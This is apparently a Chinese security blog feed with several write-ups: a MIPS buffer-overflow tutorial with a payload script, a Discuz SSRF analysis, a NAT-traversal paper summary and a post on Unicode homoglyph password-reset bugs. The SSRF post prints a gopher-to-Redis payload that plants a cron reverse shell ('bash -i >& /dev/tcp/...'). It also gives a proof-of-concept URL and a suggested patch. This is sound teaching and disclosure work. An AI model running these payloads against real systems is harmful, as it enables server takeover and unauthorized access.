lw      <span class="label">$gp</span>, 0x88+var_78(<span class="label">$fp</span>)
addiu   <span class="label">$v0</span>, <span class="label">$fp</span>, 0x88+var_70
<span class="keyword">move</span>    <span class="label">$a0</span>, <span class="label">$v0</span>

addiu   <span class="label">$sp</span>, -0x88
<span class="keyword">sw</span>      <span class="label">$ra</span>, 0x88+var_4(<span class="label">$sp</span>)
<span class="keyword">sw</span>      <span class="label">$fp</span>, 0x88+var_8(<span class="label">$sp</span>)
</code></pre><p>分配栈空间大小为0x88，然后将$ra,$fp保存在堆栈中。</p>
<pre><code>addiu   <span class="label">$a0</span>, <span class="label">$v0</span>, (aS_2 - 0x470000)  # <span class="string">"%s"</span>
addiu   <span class="label">$v0</span>, <span class="label">$fp</span>, 0x88+var_70
<span class="keyword">move</span>    <span class="label">$a1</span>, <span class="label">$v0</span>
<span class="keyword">la</span>      <span class="label">$v0</span>, __isoc99_scanf
</code></pre><p>scanf的参数a1为sp+0x18，可以计算出栈空间的分布。</p>
<p><img src="/images/simplemips5.png" alt=""></p>
<p>password分配了102个字节的空间，后面是上一个函数的栈指针和保存的$ra返回地址，让当前函数结束运行之后，CPU会从$ra处开始执行命令，而基础器$ra的值是从栈空间里保存的$ra处恢复的。（图片画错了，应该是$FP）</p>
<p>当password长度为112个字节的时候，可以覆盖返回RA，从而控制返回地址。</p>
<p><img src="/images/simplemips6.png" alt=""></p>
<p>通过动态运行进行观察，输入数据为112个字节。</p>
<pre><code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb
</code></pre><p><img src="/images/simplemips7.png" alt=""></p>
<p>返回地址覆盖成了61616262，然后程序会从0x61616262处开始执行，这会导致不可预料的后果，大部分情况都会导致内存访问违规。从而程序崩溃，抛出了段错误。</p>
<h1 id="漏洞利用">漏洞利用</h1><p>既然我们可以控制程序从一个指定的地址开始执行命令，那么如果我们知道一个以前没有权限执行的危险命令的地址，就可以通过溢出的方式欺骗程序去执行这个命令。在这个例子中我们可以尝试在没有成功登陆的情况下执行成功登陆之后的一些指令。</p>
<p>这里我们尝试用登录成功之后执行指令的地址覆盖$RA,从而在我们没有正确的密码的情况下获得需要输入密码才可以获得的信息。</p>
<pre><code>.<span class="keyword">text</span>:<span class="number">00400878</span>                 lui     <span class="variable">$v0</span>, <span class="number">0x47</span>  # <span class="string">'G'</span>
.<span class="keyword">text</span>:<span class="number">0040087</span>C                 addiu   <span class="variable">$a0</span>, <span class="variable">$v0</span>, (aWelcomeToTheNe - <span class="number">0x470000</span>)  # <span class="string">"Welcome to the new world"</span>
.<span class="keyword">text</span>:<span class="number">00400880</span>                 la      <span class="variable">$v0</span>, puts
.<span class="keyword">text</span>:<span class="number">00400884</span>                 <span class="keyword">move</span>    <span class="variable">$t9</span>, <span class="variable">$v0</span>
.<span class="keyword">text</span>:<span class="number">00400888</span>                 jalr    <span class="variable">$t9</span> ; puts
.<span class="keyword">text</span>:<span class="number">0040088</span>C                 nop
.<span class="keyword">text</span>:<span class="number">00400890</span>                 lw      <span class="variable">$gp</span>, <span class="number">0x88</span>+var_78(<span class="variable">$fp</span>)
.<span class="keyword">text</span>:<span class="number">00400894</span>                 j       loc_4008B8
.<span class="keyword">text</span>:<span class="number">00400898</span>                 nop
</code></pre><p>输入正确的密码之后，会跳转到0x00400878处执行。通过前面的分析，已经知道需要112个字节来覆盖$RA。写一个小脚本来生成我们需要的payload</p>
<pre><code>import struct
shellcode = <span class="string">"a"</span>*<span class="number">108</span>
shellcode += struct.<span class="function"><span class="title">pack</span><span class="params">(<span class="string">"&gt;L"</span>,<span class="number">0</span>x00400878)</span></span>
fw = <span class="function"><span class="title">open</span><span class="params">(<span class="string">'shellcode'</span>,<span class="string">'w'</span>)</span></span>
fw.<span class="function"><span class="title">write</span><span class="params">(shellcode)</span></span>
fw.<span class="function"><span class="title">close</span><span class="params">()</span></span>
print ‘ok<span class="string">'</span>
</code></pre><p>可以看到程序成功输出了 ‘welcome to the new world’。</p>
<p><img src="/images/simplemips8.png" alt=""></p>
<h1 id="参考资料-1">参考资料</h1><p>注1 :引用自&lt;&lt;解密家用路由器oday漏洞挖掘技术&gt;&gt;<br><a href="https://werewblog.wordpress.com/2015/11/23/a-simple-buffer-overflow-exploit-mips-architecture/" target="_blank" rel="external">A simple buffer overflow exploit (MIPS architecture)</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;缓冲区溢出原理&quot;&gt;缓冲区溢出原理&lt;/h1&gt;&lt;p&gt;简单的说，缓冲区溢出就是在大缓冲区数据向小缓冲区复制的过程中，由于没有检查小缓冲区的边界或者检查不严格，导致小缓冲区不足以接受整个大缓冲区的数据，超出的部分覆盖了与小缓冲区的相邻的内存区中的其他数据而引发的内存问题。(注1)&lt;br&gt;
    
    </summary>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
    
  </entry>
  
  <entry>
    <title>discuz最新版20160601 SSRF漏洞分析及修复方案</title>
    <link href="http://xdxd.love/2016/10/19/discuz%E6%9C%80%E6%96%B0%E7%89%8820160601-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2016/10/19/discuz最新版20160601-SSRF漏洞分析/</id>
    <published>2016-10-19T01:39:52.000Z</published>
    <updated>2016-10-19T02:49:35.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参考资料">参考资料</h2><p><a href="http://wufeifei.com/ssrf/" target="_blank" rel="external">SSRF到GET SHELL</a><br>wooyun:wooyun-2015-0151179</p>
<h2 id="漏洞poc">漏洞poc</h2><p>访问：<br>/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]<a href="http://23.88.58.149/1.jpg[/img]&amp;inajax=1&amp;fid=2&amp;wysiwyg=1&amp;formhash=ead1f9a6" target="_blank" rel="external">http://23.88.58.149/1.jpg[/img]&amp;inajax=1&amp;fid=2&amp;wysiwyg=1&amp;formhash=ead1f9a6</a></p>
<p>需要带formhash，也可以post方式请求。</p>
<p>discuz有个远程下载图片的功能。虽然有些版本编辑器没有显示远程下载图片的按钮，但是可能也存在这个方法。可以直接通过poc进行验证</p>
<p><img src="/images/discuzssrf2.png" alt=""></p>
<p>可以利用301跳转绕过discuz waf的限制，成为一个无限制的curl ssrf。</p>
<h2 id="代码分析">代码分析</h2><p>source/module/forum/forum_ajax.php</p>
<p>374行:</p>
<pre><code>} <span class="keyword">elseif</span>(<span class="variable">$_GET</span>[<span class="string">'action'</span>] == <span class="string">'downremoteimg'</span>) {
    <span class="variable">$_GET</span>[<span class="string">'message'</span>] = str_replace(<span class="keyword">array</span>(<span class="string">"\r"</span>, <span class="string">"\n"</span>), <span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">'wysiwyg'</span>] ? <span class="string">'&lt;br /&gt;'</span> : <span class="string">''</span>, <span class="string">"\\n"</span>), <span class="variable">$_GET</span>[<span class="string">'message'</span>]);
    preg_match_all(<span class="string">"/\[img\]\s*([^\[\&lt;\r\n]+?)\s*\[\/img\]|\[img=\d{1,4}[x|\,]\d{1,4}\]\s*([^\[\&lt;\r\n]+?)\s*\[\/img\]/is"</span>, <span class="variable">$_GET</span>[<span class="string">'message'</span>], <span class="variable">$image1</span>, PREG_SET_ORDER);
    preg_match_all(<span class="string">"/\&lt;img.+src=('|\"|)?(.*)(\\1)([\s].*)?\&gt;/ismUe"</span>, <span class="variable">$_GET</span>[<span class="string">'message'</span>], <span class="variable">$image2</span>, PREG_SET_ORDER);
    <span class="variable">$temp</span> = <span class="variable">$aids</span> = <span class="variable">$existentimg</span> = <span class="keyword">array</span>();
    <span class="keyword">if</span>(is_array(<span class="variable">$image1</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$image1</span>)) {
        <span class="keyword">foreach</span>(<span class="variable">$image1</span> <span class="keyword">as</span> <span class="variable">$value</span>) {
            <span class="variable">$temp</span>[] = <span class="keyword">array</span>(
                <span class="string">'0'</span> =&gt; <span class="variable">$value</span>[<span class="number">0</span>],
                <span class="string">'1'</span> =&gt; trim(!<span class="keyword">empty</span>(<span class="variable">$value</span>[<span class="number">1</span>]) ? <span class="variable">$value</span>[<span class="number">1</span>] : <span class="variable">$value</span>[<span class="number">2</span>])
            );
        }
    }
    <span class="keyword">if</span>(is_array(<span class="variable">$image2</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$image2</span>)) {
        <span class="keyword">foreach</span>(<span class="variable">$image2</span> <span class="keyword">as</span> <span class="variable">$value</span>) {
            <span class="variable">$temp</span>[] = <span class="keyword">array</span>(
                <span class="string">'0'</span> =&gt; <span class="variable">$value</span>[<span class="number">0</span>],
                <span class="string">'1'</span> =&gt; trim(<span class="variable">$value</span>[<span class="number">2</span>])
            );
        }
    }
    <span class="keyword">require_once</span> libfile(<span class="string">'class/image'</span>);
    <span class="keyword">if</span>(is_array(<span class="variable">$temp</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$temp</span>)) {
        <span class="variable">$upload</span> = <span class="keyword">new</span> discuz_upload();
        <span class="variable">$attachaids</span> = <span class="keyword">array</span>();

        <span class="keyword">foreach</span>(<span class="variable">$temp</span> <span class="keyword">as</span> <span class="variable">$value</span>) {
            <span class="variable">$imageurl</span> = <span class="variable">$value</span>[<span class="number">1</span>];
            <span class="variable">$hash</span> = md5(<span class="variable">$imageurl</span>);
            <span class="keyword">if</span>(strlen(<span class="variable">$imageurl</span>)) {
                <span class="variable">$imagereplace</span>[<span class="string">'oldimageurl'</span>][] = <span class="variable">$value</span>[<span class="number">0</span>];
                <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$existentimg</span>[<span class="variable">$hash</span>])) {
                    <span class="variable">$existentimg</span>[<span class="variable">$hash</span>] = <span class="variable">$imageurl</span>;
                    <span class="variable">$attach</span>[<span class="string">'ext'</span>] = <span class="variable">$upload</span>-&gt;fileext(<span class="variable">$imageurl</span>);
                    <span class="keyword">if</span>(!<span class="variable">$upload</span>-&gt;is_image_ext(<span class="variable">$attach</span>[<span class="string">'ext'</span>])) {
                        <span class="keyword">continue</span>;
                    }
                    <span class="variable">$content</span> = <span class="string">''</span>;
                    <span class="keyword">if</span>(preg_match(<span class="string">'/^(http:\/\/|\.)/i'</span>, <span class="variable">$imageurl</span>)) {
                        <span class="variable">$content</span> = dfsockopen(<span class="variable">$imageurl</span>);
</code></pre><p>imageurl最后进入dfsockopen。跟进dfsockopen.</p>
<p>定位到最后发出请求的函数：<br>source/function/function_filesock.php</p>
<pre><code><span class="keyword">function</span> _dfsockopen(<span class="variable">$url</span>, <span class="variable">$limit</span> = <span class="number">0</span>, <span class="variable">$post</span> = <span class="string">''</span>, <span class="variable">$cookie</span> = <span class="string">''</span>, <span class="variable">$bysocket</span> = FALSE, <span class="variable">$ip</span> = <span class="string">''</span>, <span class="variable">$timeout</span> = <span class="number">15</span>, <span class="variable">$block</span> = TRUE, <span class="variable">$encodetype</span>  = <span class="string">'URLENCODE'</span>, <span class="variable">$allowcurl</span> = TRUE, <span class="variable">$position</span> = <span class="number">0</span>, <span class="variable">$files</span> = <span class="keyword">array</span>()) {
    <span class="variable">$return</span> = <span class="string">''</span>;
    <span class="variable">$matches</span> = parse_url(<span class="variable">$url</span>);
    <span class="variable">$scheme</span> = <span class="variable">$matches</span>[<span class="string">'scheme'</span>];
    <span class="variable">$host</span> = <span class="variable">$matches</span>[<span class="string">'host'</span>];
    <span class="variable">$path</span> = <span class="variable">$matches</span>[<span class="string">'path'</span>] ? <span class="variable">$matches</span>[<span class="string">'path'</span>].(<span class="variable">$matches</span>[<span class="string">'query'</span>] ? <span class="string">'?'</span>.<span class="variable">$matches</span>[<span class="string">'query'</span>] : <span class="string">''</span>) : <span class="string">'/'</span>;
    <span class="variable">$port</span> = !empty(<span class="variable">$matches</span>[<span class="string">'port'</span>]) ? <span class="variable">$matches</span>[<span class="string">'port'</span>] : (<span class="variable">$scheme</span> == <span class="string">'http'</span> ? <span class="string">'80'</span> : <span class="string">''</span>);
    <span class="variable">$boundary</span> = <span class="variable">$encodetype</span> == <span class="string">'URLENCODE'</span> ? <span class="string">''</span> : random(<span class="number">40</span>);

    if(<span class="variable">$post</span>) {
        if(!is_array(<span class="variable">$post</span>)) {
            parse_str(<span class="variable">$post</span>, <span class="variable">$post</span>);
        }
        _format_postkey(<span class="variable">$post</span>, <span class="variable">$postnew</span>);
        <span class="variable">$post</span> = <span class="variable">$postnew</span>;
    }
    if(function_exists(<span class="string">'curl_init'</span>) &amp;&amp; function_exists(<span class="string">'curl_exec'</span>) &amp;&amp; <span class="variable">$allowcurl</span>) {
        <span class="variable">$ch</span> = curl_init();
        <span class="variable">$httpheader</span> = array();
        if(<span class="variable">$ip</span>) {
            <span class="variable">$httpheader</span>[] = <span class="string">"Host: "</span>.<span class="variable">$host</span>;
        }
        if(<span class="variable">$httpheader</span>) {
            curl_setopt(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="variable">$httpheader</span>);
        }
        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$scheme</span>.<span class="string">'://'</span>.(<span class="variable">$ip</span> ? <span class="variable">$ip</span> : <span class="variable">$host</span>).(<span class="variable">$port</span> ? <span class="string">':'</span>.<span class="variable">$port</span> : <span class="string">''</span>).<span class="variable">$path</span>);
        curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, true);
        curl_setopt(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">1</span>);
</code></pre><p>使用curl来发出http。而curl支持非常多的协议。<br><img src="/images/discuzssrf3.png" alt=""></p>
<h2 id="漏洞利用">漏洞利用</h2><p>编写一个跳转页面：</p>
<pre><code>&lt;?php  
header(<span class="string">"Location: gopher://127.0.0.1:6379/_*1<span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$8</span><span class="variable">%0d</span><span class="variable">%0aflushall</span><span class="variable">%0d</span><span class="variable">%0a</span>*3<span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$3</span><span class="variable">%0d</span><span class="variable">%0aset</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$1</span><span class="variable">%0d</span><span class="variable">%0a1</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$6</span>4<span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">%0a</span><span class="variable">%0a</span>*/1<span class="variable">%20</span>*<span class="variable">%20</span>*<span class="variable">%20</span>*<span class="variable">%20</span>*<span class="variable">%20bash</span><span class="variable">%20</span>-i<span class="variable">%20</span>&gt;&amp;<span class="variable">%20</span>/dev/tcp/{your_server}/{your_server_listen_port}<span class="variable">%200</span>&gt;&amp;1<span class="variable">%0a</span><span class="variable">%0a</span><span class="variable">%0a</span><span class="variable">%0a</span><span class="variable">%0a</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">%0d</span><span class="variable">%0a</span>*4<span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$6</span><span class="variable">%0d</span><span class="variable">%0aconfig</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$3</span><span class="variable">%0d</span><span class="variable">%0aset</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$3</span><span class="variable">%0d</span><span class="variable">%0adir</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$1</span>6<span class="variable">%0d</span><span class="variable">%0a</span>/var/spool/cron/<span class="variable">%0d</span><span class="variable">%0a</span>*4<span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$6</span><span class="variable">%0d</span><span class="variable">%0aconfig</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$3</span><span class="variable">%0d</span><span class="variable">%0aset</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$1</span>0<span class="variable">%0d</span><span class="variable">%0adbfilename</span><span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$4</span><span class="variable">%0d</span><span class="variable">%0aroot</span><span class="variable">%0d</span><span class="variable">%0a</span>*1<span class="variable">%0d</span><span class="variable">%0a</span><span class="variable">$4</span><span class="variable">%0d</span><span class="variable">%0asave</span><span class="variable">%0d</span><span class="variable">%0aquit</span><span class="variable">%0d</span><span class="variable">%0a</span>"</span>)
?&gt;
</code></pre><p>poc:</p>
<pre><code>forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]<span class="link_url">http://127.0.0.1:8054/test/301.php?1.jpg</span>[<span class="link_label">/img</span>]&amp;inajax=1&amp;fid=2&amp;wysiwyg=1&amp;formhash=ead1f9a6&amp;posttime=1476777238&amp;wysiwyg=1&amp;subject=test&amp;unused%5B%5D=1
</code></pre><p>服务器本地监听6379端口，可以看到gopher协议成功请求。</p>
<p><img src="/images/discuzssrf4.png" alt=""></p>
<h2 id="补丁分析">补丁分析</h2><p>目前discuz没有修复这个问题。不过经过测试，discuz官方论坛是关闭了这个功能的。</p>
<h2 id="修复方案">修复方案</h2><p>1，建议直接关闭远程下载图片这个功能。<br>2，在_dfsockopen方法内增加</p>
<pre><code>curl_setopt(<span class="variable">$ch</span>, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); 
</code></pre><p>将协议限制为http/https可以降低这个SSRF的危害。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;参考资料&quot;&gt;参考资料&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://wufeifei.com/ssrf/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;SSRF到GET SHELL&lt;/a&gt;&lt;br&gt;wooyun:wooyun-2015-015117
    
    </summary>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>对称NAT穿透的一种新方法</title>
    <link href="http://xdxd.love/2016/10/18/%E5%AF%B9%E7%A7%B0NAT%E7%A9%BF%E9%80%8F%E7%9A%84%E4%B8%80%E7%A7%8D%E6%96%B0%E6%96%B9%E6%B3%95/"/>
    <id>http://xdxd.love/2016/10/18/对称NAT穿透的一种新方法/</id>
    <published>2016-10-18T01:57:26.000Z</published>
    <updated>2016-10-18T03:15:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>这种方法从安全的角度来说是利用了目前路由器实现对称NAT的方法中存在端口可以预测的漏洞，利用这个漏洞来实现打洞。加上一次发送大量的包，来增加命中的概率。</p>
<h2 id="参考资料">参考资料</h2><p>整理翻译自<a href="https://www.goto.info.waseda.ac.jp/~wei/file/wei-apan-v10.pdf" target="_blank" rel="external">A New Method for Symmetric NAT Traversal in UDP and TCP</a><br><a href="http://www.cnblogs.com/my_life/articles/1908552.html" target="_blank" rel="external">NAT的四种类型及类型检测</a></p>
<h2 id="关键字">关键字</h2><p>NAT穿透，对称NAT，UDP,P2P，状态包预测，TCP，P2P打洞</p>
<h2 id="4中NAT类型">4中NAT类型</h2><p>用语定义</p>
<p>1.内部Tuple：指内部主机的私有地址和端口号所构成的二元组，即内部主机所发送报文的源地址、端口所构成的二元组<br>2.外部Tuple：指内部Tuple经过NAT的源地址/端口转换之后，所获得的外部地址、端口所构成的二元组，即外部主机收到经NAT转换之后的报文时，它所看到的该报文的源地址（通常是NAT设备的地址）和源端口<br>3.目标Tuple：指外部主机的地址、端口所构成的二元组，即内部主机所发送报文的目标地址、端口所构成的二元组</p>
<p>详细释义</p>
<ol>
<li>Full Cone NAT：所有来自同一 个内部Tuple X的请求均被NAT转换至同一个外部Tuple Y，而不管这些请求是不是属于同一个应用或者是多个应用的。除此之外，当X-Y的转换关系建立之后，任意外部主机均可随时将Y中的地址和端口作为目标地址 和目标端口，向内部主机发送UDP报文，由于对外部请求的来源无任何限制，因此这种方式虽然足够简单，但却不那么安全.</li>
</ol>
<p><img src="/images/nat1.png" alt=""></p>
<ol>
<li>Restricted Cone NAT： 它是Full Cone的受限版本：所有来自同一个内部Tuple X的请求均被NAT转换至同一个外部Tuple Y，这与Full Cone相同，但不同的是，只有当内部主机曾经发送过报文给外部主机（假设其IP地址为Z）后，外部主机才能以Y中的信息作为目标地址和目标端口，向内部 主机发送UDP请求报文，这意味着，NAT设备只向内转发（目标地址/端口转换）那些来自于当前已知的外部主机的UDP报文，从而保障了外部请求来源的安 全性</li>
</ol>
<p><img src="/images/nat2.png" alt=""></p>
<ol>
<li>Port Restricted Cone NAT：它是Restricted Cone NAT的进一步受限版。只有当内部主机曾经发送过报文给外部主机（假设其IP地址为Z且端口为P）之后，外部主机才能以Y中的信息作为目标地址和目标端 口，向内部主机发送UDP报文，同时，其请求报文的源端口必须为P，这一要求进一步强化了对外部报文请求来源的限制，从而较Restrictd Cone更具安全性</li>
</ol>
<p><img src="/images/nat3.png" alt=""></p>
<ol>
<li>Symmetric NAT：这是一种比所有Cone NAT都要更为灵活的转换方式：在Cone NAT中，内部主机的内部Tuple与外部Tuple的转换映射关系是独立于内部主机所发出的UDP报文中的目标地址及端口的，即与目标Tuple无关； 在Symmetric NAT中，目标Tuple则成为了NAT设备建立转换关系的一个重要考量：只有来自于同一个内部Tuple 、且针对同一目标Tuple的请求才被NAT转换至同一个外部Tuple，否则的话，NAT将为之分配一个新的外部Tuple；打个比方，当内部主机以相 同的内部Tuple对2个不同的目标Tuple发送UDP报文时，此时NAT将会为内部主机分配两个不同的外部Tuple，并且建立起两个不同的内、外部 Tuple转换关系。与此同时，只有接收到了内部主机所发送的数据包的外部主机才能向内部主机返回UDP报文，这里对外部返回报文来源的限制是与Port Restricted Cone一致的。不难看出，如果说Full Cone是要求最宽松NAT UDP转换方式，那么，Symmetric NAT则是要求最严格的NAT方式，其不仅体现在转换关系的建立上，而且还体现在对外部报文来源的限制方面。</li>
</ol>
<p><img src="/images/nat4.png" alt=""></p>
<h2 id="已经存在的穿透方案">已经存在的穿透方案</h2><p>UPNP，STUN，Teredo等都无法支持对称NAT(第4类NAT)穿透。</p>
<h2 id="新方法">新方法</h2><p>新方法的UDP打洞基于端口预测和限制TTL的值。也适用于其他的NAT类型。<br>新方法一共有3个阶段。</p>
<p><img src="/images/nat5.png" alt=""></p>
<h3 id="第一阶段">第一阶段</h3><p>假设两个通讯的终端分别为echo client和echo server。</p>
<p>F1：echo client跟S1通讯，然后S1获得其经过NAT a的端口号。<br>F2：S1返回获得的端口号给echo client<br>F3：echo client给S2发一个包。包括上次S1返回的nat之后的端口号。S2记录下相关的NAT端口信息。<br><img src="/images/nat6.png" alt=""></p>
<h3 id="第二阶段">第二阶段</h3><p>第二阶段是echo server跟S1和S2通信。流程跟echo client类似。</p>
<p><img src="/images/nat7.png" alt=""></p>
<h3 id="第三阶段">第三阶段</h3><p>经过之前的通讯，服务器可以获得echo client和echo server两次nat的端口号。比如echo client第一次nat端口为5361，第二次nat端口为5362，那么有理由猜测，第三次的端口为5363.经过测试发现端口的变化多是有一定的规律，递增，递减，跳跃等。</p>
<p>F7: 基于前面两个阶段的通信，可以预测打洞的端口和打洞的模式。发送给echo server.<br>F8: 基于预测的端口，echo server发送大量的包。这些包包括一个固定的目的端口和低的TTL值。<br>F9: 同理，服务器将预测的端口发给echo client，跟F7类似。<br>F10: 基于预测的端口，echo client发送大量固定端口的数据包到预测的端口。之后，echo client 转换到接受模式。</p>
<p>如果预测的端口刚好被大量的包都命中。那么就可以建立通信。</p>
<p><img src="/images/nat8.png" alt=""></p>
<h2 id="新方法的优势">新方法的优势</h2><h2 id="结论">结论</h2><p><img src="/images/nat9.png" alt=""></p>
<p>这种方法从安全的角度来说是利用了目前路由器实现对称NAT的方法中存在端口可以预测的漏洞，利用这个漏洞来实现打洞。加上一次发送大量的包，来增加命中的概率。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;&lt;p&gt;这种方法从安全的角度来说是利用了目前路由器实现对称NAT的方法中存在端口可以预测的漏洞，利用这个漏洞来实现打洞。加上一次发送大量的包，来增加命中的概率。&lt;/p&gt;
&lt;h2 id=&quot;参考资料&quot;&gt;参考资料&lt;/h2&gt;&lt;p&gt;整理翻译自&lt;a hre
    
    </summary>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
    
  </entry>
  
  <entry>
    <title>unicode同形字引起的安全问题</title>
    <link href="http://xdxd.love/2016/10/17/unicode%E5%90%8C%E5%BD%A2%E5%AD%97%E5%BC%95%E8%B5%B7%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
    <id>http://xdxd.love/2016/10/17/unicode同形字引起的安全问题/</id>
    <published>2016-10-17T00:25:08.000Z</published>
    <updated>2016-10-19T05:42:32.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="历史上的安全漏洞">历史上的安全漏洞</h1><h2 id="spotify的漏洞">spotify的漏洞</h2><p><a href="https://labs.spotify.com/2013/06/18/creative-usernames/" target="_blank" rel="external">spotify任意用户密码修改漏洞</a><br>漏洞简介:<br>找一个需要黑掉的账号，比如以bigbird为例。创建一个账户名为 ᴮᴵᴳᴮᴵᴿᴰ (in python this is the string u’\u1d2e\u1d35\u1d33\u1d2e\u1d35\u1d3f\u1d30′)。然后申请修改忘记密码，修改自己申请的账号密码。修改之后以刚刚设置的密码登录bigbird。就可以成功登录。<br>spotify的漏洞相比于github的漏洞来说是一个真正的高危漏洞，可以修改任意用户的密码。</p>
<h2 id="github的漏洞">github的漏洞</h2><p>相关资料：</p>
<p><a href="https://twitter.com/GitHubSecurity/status/757686530748125184" target="_blank" rel="external">https://twitter.com/GitHubSecurity/status/757686530748125184</a><br><a href="https://bounty.github.com/researchers/jagracey.html?ljh" target="_blank" rel="external">https://bounty.github.com/researchers/jagracey.html?ljh</a></p>
<p>漏洞简介：<br>github的邮箱名允许unicode字符，导致可以把找回密码的token发送到攻击者的邮箱。假设有 mike@example.org vs mıke@example.org 两个邮箱。重置mıke@example.org用户的密码。github在处理邮箱名字的时候，会把mıke@example.org标准化成mike@example.org，从而把mike@example.org用户的密码重置token发送到了mıke@example.org的邮箱。</p>
<p>从twitter的讨论来以及自己的测试结果来看提供邮箱服务的产品大部分都是白名单了邮箱的用户名，所以都是不可以使用unicode字符的。测试了网易的企业邮箱和腾讯的企业邮箱，都不可以使用unicode字符。所以只能自己搭一个邮件服务器来测试这个问题。</p>
<h1 id="魔法在哪里">魔法在哪里</h1><h2 id="编码的基础知识、unicode编码和同形字">编码的基础知识、unicode编码和同形字</h2><p>参考资料：<br><a href="http://www.freebuf.com/articles/web/25623.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/25623.html</a><br><a href="http://www.irongeek.com/homoglyph-attack-generator.php" target="_blank" rel="external">http://www.irongeek.com/homoglyph-attack-generator.php</a></p>
<p>了解了编码是二进制和字符之间的映射关系之后，可以了解到unicode字符无非也是一种字符而已，只要程序支持，应该不会有任何问题。为什么这个unicode字符在处理过程中变成了另外一个字符，而且是看起来很相似的字符，难道程序也跟人眼看一样，被相同的外表迷惑了。显然程序处理的是二进制的数据，只要二进制不同，无论外表看起来多么一样，程序都应该可以分辨出来。关于unicode同形字的问题，unicode homoglyphs，其实早就有不少讨论。不过大多是利用同形字来迷惑人钓鱼之类。那么机器怎么也会被同形字迷惑呢。</p>
<p>github的漏洞描述中是这么写的:a flaw in the way email addresses were being normalized to standard character sets when used to look up accounts during the password recovery flow. 在邮件地址标准化成标准的字符集的时候出现问题。</p>
<p>而spoity中对有对详细漏洞的代码分析：可以看到也是对字符串的标准化操作导致unicode字符转换成了与他同形的ascii字符。</p>
<h2 id="unicode转ascii">unicode转ascii</h2><p>参考资料：<br><a href="https://www.peterbe.com/plog/unicode-to-ascii" target="_blank" rel="external">https://www.peterbe.com/plog/unicode-to-ascii</a><br><a href="http://savanttools.com/unicode-to-ascii.asp" target="_blank" rel="external">http://savanttools.com/unicode-to-ascii.asp</a></p>
<p>这里才是最有意思的地方，为什么对unicode字符的标准化会导致unicode转变成了对应的同形字。电脑应该是只看二进制，又不是跟人一样，会被同形的字迷惑。通过搜索发现，原来有专门的unicode转ascii函数，对unicode于同形的ascii之间有对应的map。</p>
<p>比如github中提到的例子，转成对应的ascii就刚好对的上。<br><img src="/images/unicodesec1.png" alt="image"></p>
<h1 id="漏洞原理">漏洞原理</h1><p>漏洞的原理比较有意思，主要的条件是用户的id支持unicode。比如两个ID：mike@example.org vs mıke@example.org<br>然而在一些业务逻辑中会对用户id做标准化的操作，比如重置密码的时候，mıke@example.org标准化之后变成了mike@example.org，从而重置了mike@example.org的密码。</p>
<p>所以关键的条件就是用户识别的ID(包括可以用来登录的邮箱)支持unicode。而在某些业务逻辑中有对unicode字符进行所谓标准化，转换成了对应的ascii。其实假如某些业务逻辑不支持unicode，直接丢掉了那部分unicode，应该也是一样的，目前没有看到类似的案例。导致在这部分业务逻辑中出现了越权的问题。典型的场景就是修改密码，导致可以修改他人的密码。</p>
